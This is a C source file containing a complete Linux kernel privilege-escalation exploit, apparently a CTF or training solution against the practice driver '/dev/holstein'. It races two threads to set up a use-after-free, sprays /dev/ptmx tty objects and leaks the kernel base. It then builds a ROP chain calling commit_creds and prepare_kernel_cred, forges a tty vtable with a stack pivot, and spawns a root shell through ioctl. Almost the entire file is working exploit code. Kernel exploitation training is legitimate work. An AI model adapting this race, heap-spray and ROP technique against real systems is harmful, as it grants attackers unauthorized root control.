#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <sched.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupted*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;
typedef uint32_t u32;

u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
char buf[0x505]; // declaration in global to prevent bad coding pratice (etc, forget to rewrite struct metadata value when heap overflow)
u64 rop[105];
u64 fd1, fd2, okrace = 0; // to race condition

void win()
{
    if(getuid() == 0)
    {
        char *argv[] = {"/bin/sh", NULL};
        char *envp[] = {NULL};
        puts("[*] enjoy");
        execve(argv[0], argv, envp);
    }
    else puts("[!] fail uid");
}

void *race(void *arg)
{
    // idk
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    {
        puts("sched_setaffinity");
        exit(-1);
    }

    while(1)
    {
        while(!okrace)
        {
            int fd = open("/dev/holstein", O_RDWR);
            if(fd == fd2) okrace = 1;
            if(fd != -1 && okrace == 0) close(fd);
        }
        if(write(3, "A", 1) != 1 || write(4, "a", 1) != 1)
        {
            close(3);
            close(4);
            okrace = 0;
        }
        else break;
        usleep(1000); // why sleep ?
    }
    //pthread_exit(0); // should i add this?
}

void *spray_thread(void *arg)
{
    // idk
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    {
        puts("sched_setaffinity");
        _exit(-1);
    }

    // spraying
    long spray[805];
    long x = 0;
    printf("[*] spraying %d objects\n", 800);
    for_x(i, 0, 799)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) 
        {
            for_x(j, 0, i - 1) close(spray[j]);
            return (void *)-1;
        }
        if(read(fd2, &x, 8) == 8 && x == 0x0000000100005401) // check if tty if overlap with fd2
        {
            for_x(j, 0, i - 1) close(spray[j]);
            return (void *)spray[i];
        }
    }
    for_x(j, 0, 799) close(spray[j]);
    return (void *)-1;
}

u64 create_overlap()
{
    pthread_t th1, th2;
    char tmpbuf[0x10] = {0};
    cpu_set_t t1_cpu, t2_cpu;

    // cpu affinity
    CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);

    // check 2 next fds
    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    printf("[?] next two fds are: fd1 <%ld>, fd2 <%ld>\n", fd1, fd2);

    // race condition
    puts("[*] running 2 threads");
    pthread_create(&th1, 0, race, (void *)&t1_cpu);
    pthread_create(&th2, 0, race, (void *)&t2_cpu);
    pthread_join(th1, 0);
    pthread_join(th2, 0);
        // double check race
    write(fd1, "vanished", 9);
    read(fd2, tmpbuf, 9);
    if(strcmp(tmpbuf, "vanished")) 
    {
        // should improve this
        _exit(1);
    }
    puts("[*] race condition success");

    // create UAF
    close(fd1);

    // heap spray
    long victim_fd = -1;
    victim_fd = (long)spray_thread((void *)&t1_cpu);
    if(victim_fd == -1)
    {
        puts("[*] try spraying on another CPU");
        pthread_create(&th1, 0, spray_thread, (void *)&t2_cpu);
        pthread_join(th1, (void *)&victim_fd);
    }
    if(victim_fd == -1) _exit(0);

    printf("[???] overlapped victim fd <%ld>\n", victim_fd);
    return (u64)victim_fd;
} 

int main()
{
    puts("[*] UAF #1");
	u64 victim_ptmx = create_overlap();

    // leaking kbase and g_buf (UAF#1's fd2's g_buf)
    printf("[*] leaking\n");
    read(fd2, buf, 0x400);
    kbase = *(u64 *)&buf[0x18] - 0xc3afe0;
    g_buf = *(u64 *)&buf[0x38] - 0x38;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[?] koffset: 0x%lx\n", koffset);

    // prepare rop chain
    save_state((u64)&win);
    u64 prepare_kernel_cred = koffset + 0xffffffff81072580;
    u64 commit_creds = koffset + 0xffffffff810723e0;
    u64 pop_rdi = koffset + 0xffffffff8102da1d;
    u64 mov_rdi_rax = koffset + 0xffffffff8165094b; // 0xffffffff8165094b: mov rdi, rax; rep movsq [rdi], [rsi]; ret
    u64 pop_rcx_2dummy = koffset + 0xffffffff8130f6c9; // to help the mov_rdi_rax gadget
    u64 swapgs_n_ret2usr_chain = koffset + 0xffffffff81800e10 + 0x16; // mov rdi, rsp; ...
    u64 pivot_gadget = koffset + 0xffffffff81137da6; // 0xffffffff81137da6: push rdx; add [rbx+0x41], bl; pop rsp; pop rbp; ret;

    u64 idx = 0;

    rop[inc] = pop_rdi;
    rop[inc] = 0;
    rop[inc] = prepare_kernel_cred;
    rop[inc] = pop_rcx_2dummy;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = 0;
    rop[inc] = mov_rdi_rax;
    rop[inc] = commit_creds;
    rop[inc] = swapgs_n_ret2usr_chain;
    rop[inc] = 0; // [rdi]
    rop[inc] = 0; // [rdi + 8]
    rop[inc] = user_rip;
    rop[inc] = user_cs;
    rop[inc] = user_rflags;
    rop[inc] = user_rsp;
    rop[inc] = user_ss;
    rop[inc] = pivot_gadget;

    printf("[*] rop chain prepared, length: %lu\n", idx);
    // place rop at the end of tty struct to save memory, no need more uaf, no need more race condition
    for_x(i, 0, idx - 1) *(u64 *)(&buf[0x3f8 - 8 * i]) = rop[(idx - 1) - i];

    // fake vtable
    *(u64 *)(&buf[0x18]) = (g_buf + 0x3f8) - (0xc * 8); // padding the pivot_gadget at 0xc offset
    // overwrite tty struct
    write(fd2, buf, 0x400);
    // trigger
    puts("[*] trigger");
    u64 rdx = g_buf + 0x3f8 - (8 * (idx - 1)) - 8; // padding the rdx will point to rop when pivot
    ioctl(victim_ptmx, 0x43434343, rdx);
}
